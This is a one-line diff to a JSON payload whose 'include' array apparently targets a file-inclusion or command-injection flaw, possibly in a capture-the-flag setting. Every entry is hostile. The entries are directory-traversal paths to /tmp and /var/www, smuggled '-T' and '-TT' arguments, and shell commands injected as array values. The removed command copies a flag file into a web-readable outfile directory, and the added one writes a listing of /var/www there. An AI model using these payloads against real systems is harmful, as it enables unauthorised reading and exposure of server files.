@@ -1,1 +1,1 @@
-{"include":["../../../../../../tmp","-T","-TT","cp ../../../../../../var/www/flagt/bs ../../../../../../var/www/outfile/flagt/master/x1"]}
+{"include":["../../../../../../tmp","-T","-TT","ls -la ../../../../../../var/www > ../../../../../../var/www/outfile/flagt/master/x2.txt"]}
